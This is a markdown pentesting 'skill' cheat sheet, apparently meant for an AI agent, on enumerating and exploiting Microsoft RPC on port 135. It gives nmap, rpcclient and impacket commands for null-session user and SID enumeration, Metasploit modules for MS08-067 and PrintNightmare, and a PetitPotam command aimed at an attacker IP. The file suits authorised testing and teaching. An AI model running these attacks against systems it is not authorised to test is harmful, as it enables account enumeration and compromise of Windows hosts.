# MSRPC Pentesting Skill

## Goal

Enumerate and exploit Microsoft RPC services for Windows host reconnaissance and potential code execution.

## Port

- **135** - MSRPC Endpoint Mapper
- **49152-65535** - Dynamic RPC ports

## Methodology

1. **Identify MSRPC:** Scan for port 135
2. **Enumerate Endpoints:** List RPC interfaces and endpoints
3. **Identify Services:** Map interfaces to services
4. **Test Authentication:** Check for anonymous access
5. **Exploit Vulnerabilities:** Attack vulnerable RPC interfaces

## Enumeration

```bash
# Nmap scan
nmap -sV -p 135 <target>

# Enumerate RPC endpoints
nmap -p 135 --script msrpc-enum <target>
```

## RPC Endpoint Enumeration

```bash
# Using rpcclient
rpcclient -U "" -N <target>

# Using impacket
python3 rpcdump.py <target>

# Using metasploit
use auxiliary/scanner/dcerpc/endpoint_mapper
```

## Common RPC Interfaces

| UUID | Service |
|------|---------|
| 12345778-1234-abcd-ef00-0123456789ab | LSA |
| 12345778-1234-abcd-ef00-0123456789ac | SAMR |
| 3919286a-b10c-11d0-9ba8-00c04fd92ef5 | lsarpc |
| 1ff70682-0a51-30e8-076d-740be8cee98b | atsvc (Scheduled Tasks) |
| 338cd001-2244-31f1-aaaa-900038001003 | winreg |
| 367abb81-9844-35f1-ad32-98f038001003 | svcctl (Services) |

## rpcclient Commands

```bash
# Connect
rpcclient -U "" -N <target>
rpcclient -U "user%password" <target>

# Enumerate users
enumdomusers

# Get user info
queryuser <rid>

# Enumerate groups
enumdomgroups

# List shares
netshareenumall
```

## impacket Tools

```bash
# Dump RPC endpoints
python3 rpcdump.py <target>

# Login with credentials
python3 rpcdump.py domain/user:password@<target>

# Use specific RPC services
python3 samrdump.py <target>
python3 lookupsid.py <target>
```

## Exploiting RPC Interfaces

```bash
# SAMR - enumerate users
python3 samrdump.py <target>

# LSA - SID lookup
python3 lookupsid.py <target>

# SVCCTL - service control
python3 services.py <target> list
```

## Known Vulnerabilities

```bash
# MS08-067 (NetAPI)
use exploit/windows/smb/ms08_067_netapi

# PrintNightmare (CVE-2021-34527)
use exploit/windows/dcerpc/cve_2021_1675_printnightmare

# PetitPotam (CVE-2021-36942)
python3 petitpotam.py <attacker_ip> <target>
```

## Anonymous Enumeration Check

```bash
# Try null session
rpcclient -U "" -N <target>

# If works, enumerate:
srvinfo
enumdomains
enumdomusers
```

## Tools

* **rpcdump.py** - Impacket RPC endpoint dumper
* **rpcclient** - Samba RPC client
* **Metasploit** - RPC exploitation modules
* **Nmap** - RPC enumeration scripts

## Guidance for AI

* Activate when port 135 is open
* RPC endpoints map to Windows services
* Check for null session access
* SAMR, LSA, SVCCTL interfaces most valuable
* Recent PrintNightmare-type exploits target RPC
* RPC dynamic ports (49152+) used for actual communication
